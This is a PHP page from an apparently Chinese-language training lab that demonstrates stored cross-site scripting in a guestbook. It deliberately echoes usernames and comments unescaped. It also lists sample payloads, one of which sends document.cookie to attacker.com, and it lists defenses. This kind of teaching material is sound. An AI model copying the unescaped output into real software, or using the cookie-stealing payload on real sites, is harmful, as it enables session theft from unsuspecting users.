<?php
// 存储型XSS漏洞演示 - 使用文件持久化存储
$comments_file = __DIR__ . '/data/comments.json';

// 确保数据目录存在
if (!is_dir(__DIR__ . '/data')) {
    mkdir(__DIR__ . '/data', 0755, true);
}

// 初始化留言数据（如果不存在）
if (!file_exists($comments_file)) {
    $default_comments = [
        ['user' => '管理员', 'content' => '欢迎来到留言板，请大家文明发言！', 'time' => '2024-01-01 10:00'],
        ['user' => '游客A', 'content' => '这个网站真不错！', 'time' => '2024-01-01 11:30'],
    ];
    file_put_contents($comments_file, json_encode($default_comments, JSON_UNESCAPED_UNICODE));
}

// 读取留言数据
$comments = json_decode(file_get_contents($comments_file), true) ?: [];

// 处理新留言
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username'], $_POST['content'])) {
    $username = $_POST['username'];
    $content = $_POST['content'];
    
    $comments[] = [
        'user' => $username,
        'content' => $content,
        'time' => date('Y-m-d H:i:s')
    ];
    
    // 保存到文件
    file_put_contents($comments_file, json_encode($comments, JSON_UNESCAPED_UNICODE));
    
    header('Location: 02_stored.php');
    exit;
}

// 清空留言
if (isset($_GET['clear'])) {
    file_put_contents($comments_file, json_encode([], JSON_UNESCAPED_UNICODE));
    header('Location: 02_stored.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>存储型XSS漏洞</title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        body {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: 30px auto;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 35px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            margin-bottom: 25px;
        }
        .card h2 {
            color: #333;
            margin-bottom: 20px;
        }
        .alert-danger {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 25px;
        }
        .info-section {
            background: #fff3cd;
            border-left: 5px solid #ffc107;
            padding: 20px;
            border-radius: 0 10px 10px 0;
            margin-bottom: 25px;
        }
        .comment-form {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 15px;
            margin-bottom: 25px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        .form-group input,
        .form-group textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
        }
        .form-group textarea {
            min-height: 100px;
            resize: vertical;
        }
        .btn {
            padding: 12px 30px;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
        }
        .btn-danger {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
        }
        .comments-list {
            margin-top: 20px;
        }
        .comment-item {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 15px;
            border-left: 4px solid #f5576c;
        }
        .comment-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            color: #666;
            font-size: 14px;
        }
        .comment-user {
            font-weight: 600;
            color: #f5576c;
        }
        .comment-content {
            color: #333;
            line-height: 1.6;
        }
        .payload-list {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            margin: 15px 0;
        }
        .payload-list code {
            color: #7ee787;
            cursor: pointer;
            display: block;
            padding: 5px 0;
        }
        .payload-list code:hover {
            text-decoration: underline;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #f5576c;
            text-decoration: none;
            font-weight: 600;
        }
        .flag-box {
            background: #d4edda;
            border: 2px solid #28a745;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            display: none;
        }
        .flag-box.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="alert-danger">
                <h4>🚨 存储型XSS漏洞</h4>
                <p>本留言板存在存储型XSS漏洞，用户输入直接存储到服务器并展示，未进行任何过滤。</p>
            </div>
            
            <h2>2. 💾 存储型XSS</h2>
            
            <div class="info-section">
                <strong>💡 漏洞说明：</strong><br>
                存储型XSS是指恶意脚本被永久存储在服务器上（如数据库、文件等），<br>
                当其他用户访问包含恶意代码的页面时，脚本会在其浏览器中执行。<br>
                <br>
                <strong>危害：</strong>影响所有访问该页面的用户，可窃取Cookie、伪造请求等
            </div>
        </div>

        <div class="card">
            <h3>📝 发表留言（存在漏洞）</h3>
            <form method="POST" class="comment-form">
                <div class="form-group">
                    <label>昵称</label>
                    <input type="text" name="username" placeholder="输入昵称" required>
                </div>
                <div class="form-group">
                    <label>留言内容</label>
                    <textarea name="content" placeholder="输入留言内容..." required></textarea>
                </div>
                <button type="submit" class="btn">发表留言</button>
                <a href="?clear=1" class="btn btn-danger" style="margin-left: 10px; text-decoration: none;">清空留言</a>
            </form>
        </div>

        <div class="card">
            <h3>💬 留言列表</h3>
            <div class="comments-list">
                <?php if (empty($comments)): ?>
                    <p style="text-align: center; color: #999;">暂无留言</p>
                <?php else: ?>
                    <?php foreach ($comments as $comment): ?>
                    <div class="comment-item">
                        <div class="comment-header">
                            <span class="comment-user">
                                <!-- 漏洞点：直接输出用户名，未转义 -->
                                <?php echo $comment['user']; ?>
                            </span>
                            <span><?php echo htmlspecialchars($comment['time']); ?></span>
                        </div>
                        <div class="comment-content">
                            <!-- 漏洞点：直接输出内容，未转义 -->
                            <?php echo $comment['content']; ?>
                        </div>
                    </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>

        <div class="card">
            <h3>🎯 攻击Payload示例</h3>
            <p>在留言内容中使用以下Payload：</p>
            <div class="payload-list">
                <code onclick='setPayload("<script>alert(\"存储型XSS\")</script>")'>&lt;script&gt;alert("存储型XSS")&lt;/script&gt;</code>
                <code onclick='setPayload("<img src=x onerror=alert(document.cookie)>")'>&lt;img src=x onerror=alert(document.cookie)&gt;</code>
                <code onclick='setPayload("<svg/onload=fetch(\"http://attacker.com/steal?c=\"+document.cookie)>")'>&lt;svg/onload=fetch("http://attacker.com/steal?c="+document.cookie)&gt;</code>
            </div>
            
            <div id="flagBox" class="flag-box">
                🚩 FLAG{Stored_XSS_Vulnerability_Exploited}<br>
                <span style="font-size: 0.9rem;">你成功触发了存储型XSS！所有访问者都会受到影响。</span>
            </div>
        </div>

        <div class="card">
            <h3>🛡️ 防御方法</h3>
            <div class="info-section">
                1. <strong>输出编码：</strong>对所有用户输入的内容进行HTML实体编码<br>
                2. <strong>输入过滤：</strong>使用XSS过滤器（如HTML Purifier）<br>
                3. <strong>CSP策略：</strong>限制内联脚本的执行<br>
                4. <strong>HttpOnly Cookie：</strong>防止脚本访问敏感Cookie
            </div>
            <a href="index.php" class="back-link">← 返回XSS模块首页</a>
        </div>
    </div>

    <script>
        function setPayload(payload) {
            document.querySelector('textarea[name="content"]').value = payload;
        }
        
        // 检测是否触发了存储型XSS
        window.onload = function() {
            const comments = document.querySelectorAll('.comment-content');
            comments.forEach(comment => {
                const html = comment.innerHTML;
                if (html.includes('<script>') || html.includes('onerror=') || html.includes('onload=')) {
                    document.getElementById('flagBox').classList.add('show');
                }
            });
        };
    </script>
</body>
</html>
